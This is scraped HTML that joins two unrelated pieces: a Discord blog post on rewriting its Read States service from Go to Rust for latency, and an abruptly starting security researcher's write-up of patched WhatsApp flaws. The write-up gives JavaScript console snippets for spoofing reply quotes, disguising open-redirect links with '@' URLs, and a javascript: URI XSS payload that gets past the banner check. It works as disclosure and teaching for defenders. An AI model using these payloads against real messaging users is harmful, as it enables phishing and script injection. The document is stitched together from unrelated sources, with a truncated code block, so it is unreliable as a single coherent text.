&lt;div&gt;&lt;a href=&quot;https://blog.discordapp.com/@jesse_11222?source=post_page-----a190bbca2b1f----------------------&quot; rel=&quot;noopener&quot;&gt;&lt;img alt=&quot;Jesse Howarth&quot; class=&quot;r fa fb fc&quot; src=&quot;https://miro.medium.com/fit/c/96/96/1*tNrZL0th3ePB5oiniU6Ryg.png&quot; width=&quot;48&quot; height=&quot;48&quot;/&gt;&lt;/a&gt;&lt;/div&gt;

&lt;/div&gt;

&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;

&lt;p id=&quot;27aa&quot; class=&quot;hl hm ed at hn b ho hp hq hr hs ht hu hv hw hx hy dv&quot;&gt;Rust is becoming a first class language in a variety of domains. At Discord, we’ve seen success with Rust on the client side and server side. For example, we use it on the client side for our video encoding pipeline for Go Live and on the server side for &lt;a class=&quot;da by hz ia ib ic&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; href=&quot;https://blog.discordapp.com/using-rust-to-scale-elixir-for-11-million-concurrent-users-c6f19fc029d3&quot;&gt;Elixir NIFs&lt;/a&gt;. Most recently, we drastically improved the performance of a service by switching its implementation from Go to Rust. This post explains why it made sense for us to reimplement the service, how it was done, and the resulting performance improvements.&lt;/p&gt;

&lt;p id=&quot;0ea8&quot; class=&quot;hl hm ed at hn b ho ip hq iq hs ir hu is hw it hy dv&quot;&gt;Discord is a product focused company, so we’ll start with some product context. The service we switched from Go to Rust is the “Read States” service. Its sole purpose is to keep track of which channels and messages you have read. Read States is accessed every time you connect to Discord, every time a message is sent and every time a message is read. In short, Read States is in the hot path. We want to make sure Discord feels super snappy all the time, so we need to make sure Read States is quick.&lt;/p&gt;
&lt;p id=&quot;5c55&quot; class=&quot;hl hm ed at hn b ho hp hq hr hs ht hu hv hw hx hy dv&quot;&gt;With the Go implementation, the Read States service was not supporting its product requirements. It was fast most of the time, but every few minutes we saw large latency spikes that were bad for user experience. After investigating, we determined the spikes were due to core Go features: its memory model and garbage collector (GC).&lt;/p&gt;

&lt;p id=&quot;4776&quot; class=&quot;hl hm ed at hn b ho ip hq iq hs ir hu is hw it hy dv&quot;&gt;To explain why Go wasn’t meeting our performance targets, we first need to discuss the data structures, scale, access patterns, and architecture of the service.&lt;/p&gt;
&lt;p id=&quot;e488&quot; class=&quot;hl hm ed at hn b ho hp hq hr hs ht hu hv hw hx hy dv&quot;&gt;The data structure we use to store read state information is conveniently called “Read State”. Discord has billions of Read States. There is one Read State per User per Channel. Each Read State has several counters that need to be updated atomically and often reset to 0. For example, one of the counters is how many @mentions you have in a channel.&lt;/p&gt;
&lt;p id=&quot;d018&quot; class=&quot;hl hm ed at hn b ho hp hq hr hs ht hu hv hw hx hy dv&quot;&gt;In order to get quick atomic counter updates, each Read States server has a Least Recently Used (LRU) cache of Read States. There are millions of Users in each cache. There are tens of millions of Read States in each cache. There are hundreds of thousands of cache updates per second.&lt;/p&gt;
&lt;p id=&quot;1b7f&quot; class=&quot;hl hm ed at hn b ho hp hq hr hs ht hu hv hw hx hy dv&quot;&gt;For persistence, we back the cache with a Cassandra database cluster. On cache key eviction, we commit your Read States to the database. We also schedule a database commit for 30 seconds in the future whenever a Read State is updated. There are tens of thousands of database writes per second.&lt;/p&gt;
&lt;p id=&quot;2a00&quot; class=&quot;hl hm ed at hn b ho hp hq hr hs ht hu hv hw hx hy dv&quot;&gt;In the picture below, you can see the response time and system cpu for a peak sample time frame for the Go service.¹ As you might notice, there are latency and CPU spikes roughly every 2 minutes.&lt;/p&gt;


&lt;p id=&quot;369a&quot; class=&quot;hl hm ed at hn b ho ip hq iq hs ir hu is hw it hy dv&quot;&gt;In Go, on cache key eviction, memory is not immediately freed. Instead, the garbage collector runs every so often to find any memory that has no references and then frees it. In other words, instead of freeing immediately after the memory is out of use, memory hangs out for a bit until the garbage collector can determine if it’s truly out of use. During garbage collection, Go has to do a lot of work to determine what memory is free, which can slow the program down.&lt;/p&gt;
&lt;p id=&quot;17f6&quot; class=&quot;hl hm ed at hn b ho hp hq hr hs ht hu hv hw hx hy dv&quot;&gt;These latency spikes definitely smelled like garbage collection performance impact, but we had written the Go code very efficiently and had very few allocations. We were not creating a lot of garbage.&lt;/p&gt;
&lt;p id=&quot;12f3&quot; class=&quot;hl hm ed at hn b ho hp hq hr hs ht hu hv hw hx hy dv&quot;&gt;After digging through the Go source code, we learned that Go will force a garbage collection run every &lt;a href=&quot;https://github.com/golang/go/blob/895b7c85addfffe19b66d8ca71c31799d6e55990/src/runtime/proc.go#L4481-L4486&quot; class=&quot;da by hz ia ib ic&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;2 minutes at minimum&lt;/a&gt;. In other words, if garbage collection has not run for 2 minutes, regardless of heap growth, go will still force a garbage collection.&lt;/p&gt;
&lt;p id=&quot;90c7&quot; class=&quot;hl hm ed at hn b ho hp hq hr hs ht hu hv hw hx hy dv&quot;&gt;We figured we could tune the garbage collector to happen more often in order to prevent large spikes, so we implemented an endpoint on the service to change the garbage collector &lt;a href=&quot;https://golang.org/pkg/runtime/debug/#SetGCPercent&quot; class=&quot;da by hz ia ib ic&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;GC Percent&lt;/a&gt; on the fly. Unfortunately, no matter how we configured the GC percent nothing changed. How could that be? It turns out, it was because we were not allocating memory quickly enough for it to force garbage collection to happen more often.&lt;/p&gt;
&lt;p id=&quot;32bb&quot; class=&quot;hl hm ed at hn b ho hp hq hr hs ht hu hv hw hx hy dv&quot;&gt;We kept digging and learned the spikes were huge not because of a massive amount of ready-to-free memory, but because the garbage collector needed to scan the entire LRU cache in order to determine if the memory was truly free from references. Thus, we figured a smaller LRU cache would be faster because the garbage collector would have less to scan. So we added another setting to the service to change the size of the LRU cache and changed the architecture to have many partitioned LRU caches per server.&lt;/p&gt;
&lt;p id=&quot;7058&quot; class=&quot;hl hm ed at hn b ho hp hq hr hs ht hu hv hw hx hy dv&quot;&gt;We were right. With the LRU cache smaller, garbage collection resulted in smaller spikes.&lt;/p&gt;
&lt;p id=&quot;1436&quot; class=&quot;hl hm ed at hn b ho hp hq hr hs ht hu hv hw hx hy dv&quot;&gt;Unfortunately, the trade off of making the LRU cache smaller resulted in higher 99th latency times. This is because if the cache is smaller it’s less likely for a user’s Read State to be in the cache. If it’s not in the cache then we have to do a database load.&lt;/p&gt;
&lt;p id=&quot;4327&quot; class=&quot;hl hm ed at hn b ho hp hq hr hs ht hu hv hw hx hy dv&quot;&gt;After a significant amount of load testing different cache capacities, we found a setting that seemed okay. Not completely satisfied, but satisfied enough and with bigger fish to fry, we left the service running like this for quite some time.&lt;/p&gt;
&lt;p id=&quot;293d&quot; class=&quot;hl hm ed at hn b ho hp hq hr hs ht hu hv hw hx hy dv&quot;&gt;During that time we were seeing more and more success with Rust in other parts of Discord and we collectively decided we wanted to create the frameworks and libraries needed to build new services fully in Rust. This service was a great candidate to port to Rust since it was small and self-contained, but we also hoped that Rust would fix these latency spikes. So we took on the task of porting Read States to Rust, hoping to prove out Rust as a service language and improve the user experience.²&lt;/p&gt;

&lt;blockquote class=&quot;iw ix iy&quot; readability=&quot;9&quot;&gt;
&lt;p id=&quot;a209&quot; class=&quot;hl hm ed iz hn b ho hp hq hr hs ht hu hv hw hx hy dv&quot;&gt;Rust is blazingly fast and memory-efficient: &lt;strong class=&quot;hn ja&quot;&gt;with no runtime or garbage collector&lt;/strong&gt;, it can power performance-critical services, run on embedded devices, and easily integrate with other languages.³&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p id=&quot;c1a6&quot; class=&quot;hl hm ed at hn b ho hp hq hr hs ht hu hv hw hx hy dv&quot;&gt;Rust does not have garbage collection, so we figured it would not have the same latency spikes Go had.&lt;/p&gt;
&lt;p id=&quot;ee23&quot; class=&quot;hl hm ed at hn b ho hp hq hr hs ht hu hv hw hx hy dv&quot;&gt;Rust uses a relatively unique memory management approach that incorporates the idea of memory “ownership”. Basically, Rust keeps track of who can read and write to memory. It knows when the program is using memory and immediately frees the memory once it is no longer needed. It enforces memory rules at compile time, making it virtually impossible to have runtime memory bugs.⁴ You do not need to manually keep track of memory. The compiler takes care of it.&lt;/p&gt;
&lt;p id=&quot;89ce&quot; class=&quot;hl hm ed at hn b ho hp hq hr hs ht hu hv hw hx hy dv&quot;&gt;So in the Rust version of the Read States service, when a user’s Read State is evicted from the LRU cache it is immediately freed from memory. The read state memory does not sit around waiting for the garbage collector to collect it. Rust knows it’s no longer in use and frees it immediately. There is no runtime process to determine if it should be freed.&lt;/p&gt;

&lt;p id=&quot;34c2&quot; class=&quot;hl hm ed at hn b ho ip hq iq hs ir hu is hw it hy dv&quot;&gt;But there was a problem with the Rust ecosystem. At the time this service was reimplemented, Rust stable did not have a very good story for asynchronous Rust. For a networked service, asynchronous programming is a requirement. There were a few community libraries that enabled asynchronous Rust, but they required a significant amount of ceremony and the error messages were extremely obtuse.&lt;/p&gt;
&lt;p id=&quot;03e2&quot; class=&quot;hl hm ed at hn b ho hp hq hr hs ht hu hv hw hx hy dv&quot;&gt;Fortunately, the Rust team was hard at work on making asynchronous programming easy, and it was available in the unstable nightly channel of Rust.&lt;/p&gt;
&lt;p id=&quot;3def&quot; class=&quot;hl hm ed at hn b ho hp hq hr hs ht hu hv hw hx hy dv&quot;&gt;Discord has never been afraid of embracing new technologies that look promising. For example, we were early adopters of Elixir, React, React Native, and Scylla. If a piece of technology is promising and gives us an advantage, we do not mind dealing with the inherent difficulties and instability of the bleeding edge. This is one of the ways we’ve quickly reached 250+ million users with less than 50 engineers.&lt;/p&gt;
&lt;p id=&quot;c295&quot; class=&quot;hl hm ed at hn b ho hp hq hr hs ht hu hv hw hx hy dv&quot;&gt;Embracing the new async features in Rust nightly is another example of our willingness to embrace new, promising technology. As an engineering team, we decided it was worth using nightly Rust and we committed to running on nightly until async was fully supported on stable. Together we dealt with any problems that arose and at this point Rust stable supports asynchronous Rust.⁵ The bet paid off.&lt;/p&gt;

&lt;p id=&quot;dc10&quot; class=&quot;hl hm ed at hn b ho ip hq iq hs ir hu is hw it hy dv&quot;&gt;The actual rewrite was fairly straight forward. It started as a rough translation, then we slimmed it down where it made sense. For instance, Rust has a great type system with extensive support for generics, so we could throw out Go code that existed simply due to lack of generics. Also, Rust’s memory model is able to reason about memory safety across threads, so we were able to throw away some of the manual cross-goroutine memory protection that was required in Go.&lt;/p&gt;
&lt;p id=&quot;dd8e&quot; class=&quot;hl hm ed at hn b ho hp hq hr hs ht hu hv hw hx hy dv&quot;&gt;When we started load testing, we were instantly pleased with the results. The latency of the Rust version was just as good as Go’s and &lt;strong class=&quot;hn ja&quot;&gt;had no latency spikes!&lt;/strong&gt;&lt;/p&gt;
&lt;p id=&quot;4259&quot; class=&quot;hl hm ed at hn b ho hp hq hr hs ht hu hv hw hx hy dv&quot;&gt;Remarkably, we had only put very basic thought into optimization as the Rust version was written. &lt;strong class=&quot;hn ja&quot;&gt;Even with just basic optimization, Rust was able to outperform the hyper hand-tuned Go version.&lt;/strong&gt; This is a huge testament to how easy it is to write efficient programs with Rust compared to the deep dive we had to do with Go.&lt;/p&gt;
&lt;p id=&quot;09e1&quot; class=&quot;hl hm ed at hn b ho hp hq hr hs ht hu hv hw hx hy dv&quot;&gt;But we weren’t satisfied with simply matching Go’s performance. After a bit of profiling and performance optimizations, &lt;strong class=&quot;hn ja&quot;&gt;we were able to beat Go on every single performance metric&lt;/strong&gt;. Latency, CPU, and memory were all better in the Rust version.&lt;/p&gt;
&lt;p id=&quot;b948&quot; class=&quot;hl hm ed at hn b ho hp hq hr hs ht hu hv hw hx hy dv&quot;&gt;The Rust performance optimizations included:&lt;/p&gt;
&lt;ol class=&quot;&quot;&gt;&lt;li id=&quot;7c2a&quot; class=&quot;hl hm ed at hn b ho hp hq hr hs ht hu hv hw hx hy jb jc jd&quot;&gt;Changing to a BTreeMap instead of a HashMap in the LRU cache to optimize memory usage.&lt;/li&gt;
&lt;li id=&quot;ff33&quot; class=&quot;hl hm ed at hn b ho je hq jf hs jg hu jh hw ji hy jb jc jd&quot;&gt;Swapping out the initial metrics library for one that used modern Rust concurrency.&lt;/li&gt;
&lt;li id=&quot;5804&quot; class=&quot;hl hm ed at hn b ho je hq jf hs jg hu jh hw ji hy jb jc jd&quot;&gt;Reducing the number of memory copies we were doing.&lt;/li&gt;
&lt;/ol&gt;&lt;p id=&quot;e4e9&quot; class=&quot;hl hm ed at hn b ho hp hq hr hs ht hu hv hw hx hy dv&quot;&gt;Satisfied, we decided to roll out the service.&lt;/p&gt;
&lt;p id=&quot;dfba&quot; class=&quot;hl hm ed at hn b ho hp hq hr hs ht hu hv hw hx hy dv&quot;&gt;The launch was fairly seamless because we load tested. We put it out to a single canary node, found a few edge cases that were missing, and fixed them. Soon after that we rolled it out to the entire fleet.&lt;/p&gt;
&lt;p id=&quot;219d&quot; class=&quot;hl hm ed at hn b ho hp hq hr hs ht hu hv hw hx hy dv&quot;&gt;Below are the results.&lt;/p&gt;
&lt;p id=&quot;1640&quot; class=&quot;hl hm ed at hn b ho hp hq hr hs ht hu hv hw hx hy dv&quot;&gt;Go is purple, Rust is blue.&lt;/p&gt;


&lt;p id=&quot;0bed&quot; class=&quot;hl hm ed at hn b ho ip hq iq hs ir hu is hw it hy dv&quot;&gt;After the service ran successfully for a few days, we decided it was time to re-raise the LRU cache capacity. In the Go version, as mentioned above, raising the cap of the LRU cache resulted in longer garbage collections. We no longer had to deal with garbage collection, so we figured we could raise the cap of the cache and get even better performance. We increased the memory capacity for the boxes, optimized the data structure to use even less memory (for fun), and increased the cache capacity to 8 million Read States.&lt;/p&gt;
&lt;p id=&quot;5a5b&quot; class=&quot;hl hm ed at hn b ho hp hq hr hs ht hu hv hw hx hy dv&quot;&gt;The results below speak for themselves. &lt;strong class=&quot;hn ja&quot;&gt;Notice the average time is now measured in microseconds and max @mention is measured in milliseconds.&lt;/strong&gt;&lt;/p&gt;


&lt;p id=&quot;0c79&quot; class=&quot;hl hm ed at hn b ho ip hq iq hs ir hu is hw it hy dv&quot;&gt;Finally, another great thing about Rust is that it has a quickly evolving ecosystem. Recently, tokio (the async runtime we use) released version 0.2. We upgraded and it gave us CPU benefits for free. Below you can see the CPU is consistently lower starting around the 16th.&lt;/p&gt;


&lt;p id=&quot;70a9&quot; class=&quot;hl hm ed at hn b ho ip hq iq hs ir hu is hw it hy dv&quot;&gt;At this point, Discord is using Rust in many places across its software stack. We use it for the game SDK, video capturing and encoding for Go Live, &lt;a class=&quot;da by hz ia ib ic&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; href=&quot;https://blog.discordapp.com/using-rust-to-scale-elixir-for-11-million-concurrent-users-c6f19fc029d3&quot;&gt;Elixir NIFs&lt;/a&gt;, several backend services, and more.&lt;/p&gt;
&lt;p id=&quot;e70a&quot; class=&quot;hl hm ed at hn b ho hp hq hr hs ht hu hv hw hx hy dv&quot;&gt;When starting a new project or software component, we consider using Rust. Of course, we only use it where it makes sense.&lt;/p&gt;
&lt;p id=&quot;68cc&quot; class=&quot;hl hm ed at hn b ho hp hq hr hs ht hu hv hw hx hy dv&quot;&gt;Along with performance, Rust has many advantages for an engineering team. For example, its type safety and borrow checker make it very easy to refactor code as product requirements change or new learnings about the language are discovered. Also, the ecosystem and tooling are excellent and have a significant amount of momentum behind them.&lt;/p&gt;
&lt;p id=&quot;e723&quot; class=&quot;hl hm ed at hn b ho hp hq hr hs ht hu hv hw hx hy dv&quot;&gt;If you made it this far, you’re probably newly excited about Rust or have been excited for quite some time. If you want to work on interesting problems using Rust professionally, you should consider working here at Discord.&lt;/p&gt;
&lt;p id=&quot;4e47&quot; class=&quot;hl hm ed at hn b ho hp hq hr hs ht hu hv hw hx hy dv&quot;&gt;Also, a fun fact: the Rust team uses Discord to coordinate. There’s even a very helpful Rust community server that you can find us chatting in from time to time. &lt;a href=&quot;https://discord.gg/tcbkpyQ&quot; class=&quot;da by hz ia ib ic&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Click here to check it out.&lt;/a&gt;&lt;/p&gt;

<title>I found a WhatsApp security flaw that allowed hackers to read the file system</title>
<link>https://www.perimeterx.com/tech-blog/2020/whatsapp-fs-read-vuln-disclosure/</link>
<guid isPermaLink="true" >https://www.perimeterx.com/tech-blog/2020/whatsapp-fs-read-vuln-disclosure/</guid>
<description>&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;tl;dr: This is the story of how I found and helped &lt;strong&gt;Facebook&lt;/strong&gt; patch multiple security flaws in &lt;strong&gt;WhatsApp&lt;/strong&gt;, all the way from a simple &lt;strong&gt;Open-Redirect&lt;/strong&gt; through a &lt;strong&gt;Persistent-XSS&lt;/strong&gt; and &lt;strong&gt;CSP-bypass&lt;/strong&gt; to a full cross platforms &lt;strong&gt;Read From The Local File System&lt;/strong&gt; on both Windows and Mac!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr/&gt;&lt;p&gt;Back in 2017, while I was traveling in Peru, I found a security flaw that Check Point published a few months later. That flaw was simple. In the words of Check Point’s researchers in this article published in 2018, it allowed an attacker to “alter the text of someone else’s reply, essentially putting words in their mouth.”&lt;/p&gt;
&lt;p&gt;It was cool, but back then I couldn’t come up with any idea of further exploiting the flaw or finding related flaws. So except for trolling my friends a couple of times in our group chat, I kind of let it go.&lt;/p&gt;
&lt;p&gt;A year later, I decided to continue my research. I really wanted to find a major security flaw in a well-known and widely used service, and I felt like WhatsApp was a good start. So I gave it a go since I already had some clue of existing security flaws in WhatsApp mobile and web applications.&lt;/p&gt;
&lt;p&gt;I was not ready for what the next few months brought with them, but I can assure you - it was one hell of a ride. I managed to find four more unique security flaws in WhatsApp which led me all the way to persistent XSS and even reading from the local file system - by using a single message.&lt;/p&gt;
&lt;p&gt;This was my process:&lt;/p&gt;
&lt;h3&gt;1. My original finding - ‘altering the text of someone else’s reply’&lt;/h3&gt;
&lt;p&gt;First, let’s talk about what I found in the first place, in 2017, since it is the foundation for this research.&lt;/p&gt;
&lt;p&gt;I originally thought: “Using WhatsApp web, I can find the line of code where the object containing the metadata of the message is being formed, tamper with it, and then let the app continue in its natural message-sending flow, thus crafting my message while bypassing the UI filtering mechanism.&quot;&lt;/p&gt;
&lt;p&gt;So for example, by using this technique, I can alter the text of a reply to a message and send it, something I can’t achieve by legitimately using WhatsApp Web UI. I found that line and managed to have a look at the Object containing the metadata of the message. You can find this line by looking up &lt;code class=&quot;language-text&quot;&gt;return Promise.callSynchronously(function()&lt;/code&gt; in the entire code and set a breakpoint at &lt;code class=&quot;language-text&quot;&gt;var t = e.id;&lt;/code&gt;. It had a lot of interesting fields, so we’ll focus here on the relevant ones:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;javascript&quot; readability=&quot;18&quot;&gt;
&lt;pre class=&quot;language-javascript&quot;&gt;

    labels&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
  __x_quotedStanzaID&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;3EB0E42AC64D3D9BC5E7&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;So essentially, I discovered that by simply running:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;javascript&quot; readability=&quot;8&quot;&gt;
&lt;pre class=&quot;language-javascript&quot;&gt;
&lt;code class=&quot;language-javascript&quot;&gt;e&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;__x_quotedMsg&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;body &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;I think you are the worst!&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; 
e&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;__x_quotedStanzaID &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; e&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;__x_quotedStanzaID &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;_&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;before allowing the message send to execute, you'll get this:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://www.perimeterx.com/assets-redirect/image/upload/v1580827944/blog/2020/whatsapp-fs-read-vuln-disclosure/1_zzbtor.jpg&quot; alt=&quot;1&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;(This works for WhatsApp iOS/Android/Windows Desktop/Mac Desktop/Web)&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;The body of the reply quote is of a message that I have made up and was never really sent in the current conversation. That's cool, but not that powerful.&lt;/p&gt;
&lt;p&gt;What else can I take apart? What about messages with rich preview banners?&lt;/p&gt;
&lt;h3&gt;2. Dangerous Open-Redirect flaw in messages with rich preview banner using &quot;@&quot;&lt;/h3&gt;
&lt;p&gt;This is where this research becomes way more interesting. Messages with rich preview banners are messages that include banners with extra information regarding a link that is in the body of the message. So for example, if I send a message with &quot;&lt;a href=&quot;https://facebook.com&quot;&gt;https://facebook.com&lt;/a&gt;&quot; as its body, the receiver will get this:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://www.perimeterx.com/assets-redirect/image/upload/v1580827944/blog/2020/whatsapp-fs-read-vuln-disclosure/2_wbi6lh.jpg&quot; alt=&quot;2&quot;/&gt;&lt;/p&gt;
&lt;p&gt;On WhatsApp the banner is being generated on the side of the sender and this is an important point to understand. One can easily tamper with the banner properties before sending it to the receiver. Great recipe for trouble right here!&lt;/p&gt;
&lt;p&gt;The first thing I did was to craft a message that will include a legitimate looking banner, but will redirect to another domain instead by simply replacing the link:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;javascript&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;language-javascript&quot;&gt;
&lt;code class=&quot;language-javascript&quot;&gt;e&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;__x_body &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; e&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;__x_matchedText &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;https://example.com&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;And this is what I got:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://www.perimeterx.com/assets-redirect/image/upload/v1580827944/blog/2020/whatsapp-fs-read-vuln-disclosure/3_xbcdqn.jpg&quot; alt=&quot;3&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;(This works for WhatsApp iOS/Android/Windows Desktop/Mac Desktop/Web)&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Cool! Now even though the banner seems like it comes from Facebook, clicking the link will redirect to &lt;a href=&quot;https://example.com!&quot;&gt;https://example.com!&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Being familiar with all sorts of tricks used by malicious actors in the world of web, I experimented with this idea to see if this open redirect can be made more dangerous:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;javascript&quot; readability=&quot;8&quot;&gt;
&lt;pre class=&quot;language-javascript&quot;&gt;
&lt;code class=&quot;language-javascript&quot;&gt;e&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;__x_body &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; e&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;__x_matchedText &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;
  &lt;span class=&quot;token string&quot;&gt;&quot;Join Facebook! https://facebook.com+login_oage&amp;amp;welcome_to_facebook=true&amp;amp;timestamp=42837643@bit.ly/2SfZikR Become a friend of mine!&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://www.perimeterx.com/assets-redirect/image/upload/v1580827944/blog/2020/whatsapp-fs-read-vuln-disclosure/4_qql4os.jpg&quot; alt=&quot;4&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;(This works for WhatsApp iOS/Android/Windows Desktop/Mac Desktop/Web)&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;See what I did? I managed to not only mess with the banner's link, but also crafted a message with a link that looks like it belongs to &lt;a href=&quot;https://facebook.com&quot;&gt;https://facebook.com&lt;/a&gt; while the link will always redirect to &lt;a href=&quot;https://example.com!&quot;&gt;https://example.com!&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;This is dangerous because it appears authentic since both the banner and the link look like they really do belong to &lt;a href=&quot;https://facebook.com&quot;&gt;https://facebook.com&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;This works thanks to the role &quot;@&quot; plays in the &lt;a href=&quot;https://www.w3.org/Addressing/URL/url-spec.txt&quot;&gt;spec of URL&lt;/a&gt;:&lt;/p&gt;
&lt;p&gt;The purpose of &quot;@&quot; in URLs is to pass username and password to visited domains in the following way: &lt;code class=&quot;language-text&quot;&gt;https://USERNAME:PASSWORD@DOMAIN.COM&lt;/code&gt;. One can abuse this, as I just did, and replace the username and password with anything else: &lt;code class=&quot;language-text&quot;&gt;https://DOMAIN-A.COM@DOMAIN-B.com&lt;/code&gt; and it'll still work. Firefox is the only browser that warns users, by default, In case this method is used without providing a username and password.&lt;/p&gt;
&lt;p&gt;And then it hit me - if I can tamper with the message and send any link, would I be able to use &lt;code class=&quot;language-text&quot;&gt;javascript:&lt;/code&gt; URIs?&lt;/p&gt;
&lt;h3&gt;3. From an Open-Redirect to a Persistent-XSS using &lt;code class=&quot;language-text&quot;&gt;javascript:&lt;/code&gt; URIs&lt;/h3&gt;
&lt;p&gt;YES! But it's not as simple as that.&lt;/p&gt;
&lt;p&gt;At first, that's exactly what I did:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;javascript&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;language-javascript&quot;&gt;
&lt;code class=&quot;language-javascript&quot;&gt;e&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;__x_body &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; e&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;__x_matchedText &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;javascript:alert(document.domain)&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;But it didn't work. WhatsApp seemed to drop the banner on the receiving side. After a few failed attempts a thought came to my mind: maybe this happens because WhatsApp looks at the link that is attached to the banner and expects it to include a legitimate &lt;code class=&quot;language-text&quot;&gt;https:&lt;/code&gt; scheme URI?&lt;/p&gt;
&lt;p&gt;So channeling my inner hacker , I did this:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;javascript&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;language-javascript&quot;&gt;
&lt;code class=&quot;language-javascript&quot;&gt;e&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;__x_body &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; e&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;__x_matchedText &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;'javascript:&quot;https://example.com&quot;;alert(document.domain)'&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;AND IT WORKED!&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://www.perimeterx.com/assets-redirect/image/upload/v1580827944/blog/2020/whatsapp-fs-read-vuln-disclosure/5_ikds9c.jpg&quot; alt=&quot;5&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;(This works for WhatsApp Windows Desktop/Mac Desktop/Web)&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Gained a one-click Persistent-XSS!&lt;/p&gt;
&lt;p&gt;Fortunately for WhatsApp, Chromium based browsers added a defense mechanism against &lt;code class=&quot;language-text&quot;&gt;javascript:&lt;/code&gt; URIs just when I found this vulnerability. Unfortunately for WhatsApp, on other browsers such as Safari and Edge, this vulnerability was still wide open.The picture above is using Brave - an older version of the Chromium based browser.&lt;/p&gt;
